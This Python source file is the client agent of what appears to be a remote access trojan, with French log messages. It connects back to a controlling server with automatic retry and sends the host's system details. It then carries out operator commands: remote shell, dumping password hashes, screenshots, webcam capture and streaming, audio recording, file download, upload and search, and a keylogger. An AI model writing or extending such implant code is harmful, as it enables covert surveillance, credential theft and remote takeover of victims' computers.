import platform
import socket
import time
import threading

from src.utils.logger import setup_logger
from src.utils.protocol import make_msg, parse_msg, OP_RESP, OP_ERROR, OP_CMD
from src.client.network.connection import Connection
from src.client.commands import system, files, monitoring, capture

log = setup_logger("agent")


class Agent:
    def __init__(self, host=None, port=None):
        self.conn = Connection(host=host, port=port)

    def start(self):
        while True:
            try:
                self.conn.connect_with_retry()
                self._send_sysinfo()
                self._command_loop()
            except Exception as e:
                log.error(f"Erreur agent: {e}")
            finally:
                self.conn.close()
                time.sleep(10)

    def _send_sysinfo(self):
        info = {
            "os": platform.system() + " " + platform.release(),
            "hostname": socket.gethostname(),
            "arch": platform.machine(),
        }
        msg = make_msg(OP_RESP, payload=info)
        self.conn.send(msg)
        log.info("Sysinfo envoye")

    def _command_loop(self):
        log.info("En attente de commandes...")
        while True:
            try:
                raw = self.conn.recv()
            except ConnectionError as e:
                log.error(f"Connexion perdue: {e}")
                raise
            except Exception as e:
                log.error(f"Erreur recv: {e}")
                raise ConnectionError(str(e))

            msg = parse_msg(raw)
            if msg.get("op") != OP_CMD:
                continue

            cmd_str = msg.get("payload", "").strip()
            log.debug(f"Commande recue: {cmd_str}")

            try:
                resp = self._handle(msg, cmd_str)
            except Exception as e:
                log.error(f"Erreur exec '{cmd_str}': {e}")
                resp = make_msg(OP_ERROR, payload=str(e))

            if resp:
                self.conn.send(resp)

    def _handle(self, msg, cmd_str):
        parts = cmd_str.split()
        if not parts:
            return make_msg(OP_ERROR, payload="Commande vide")

        op = parts[0].lower()

        if op == "help":
            return system.cmd_help()
        elif op == "shell":
            return system.cmd_shell(self.conn, cmd_str)
        elif op == "ipconfig":
            return system.cmd_ipconfig()
        elif op == "hashdump":
            return system.cmd_hashdump()
        elif op == "screenshot":
            return capture.cmd_screenshot()
        elif op == "webcam_snapshot":
            return capture.cmd_webcam_snapshot()
        elif op == "webcam_stream":
            t = threading.Thread(
                target=capture.cmd_webcam_stream,
                args=(self.conn.send,),
                daemon=True,
            )
            t.start()
            return None
        elif op == "webcam_stream_stop":
            capture.stop_stream()
            return None
        elif op == "record_audio":
            duration = 5
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except ValueError:
                    pass
            return capture.cmd_record_audio(duration)
        elif op == "download":
            if len(parts) < 2:
                return make_msg(OP_ERROR, payload="Usage: download <path>")
            return files.cmd_download(parts[1])
        elif op == "upload":
            remote_path = parts[1] if len(parts) > 1 else "upload_recv"
            filename = msg.get("filename", "file")
            data_b64 = msg.get("data", "")
            return files.cmd_upload(remote_path, filename, data_b64)
        elif op == "search":
            if len(parts) < 2:
                return make_msg(OP_ERROR, payload="Usage: search <nom>")
            return files.cmd_search(parts[1])
        elif op == "keylogger":
            if len(parts) < 2:
                return make_msg(OP_ERROR, payload="Usage: keylogger start|stop")
            if parts[1] == "start":
                return monitoring.cmd_keylogger_start()
            elif parts[1] == "stop":
                return monitoring.cmd_keylogger_stop()
            else:
                return make_msg(OP_ERROR, payload="Usage: keylogger start|stop")
        else:
            return make_msg(OP_ERROR, payload=f"Commande inconnue: {op}")
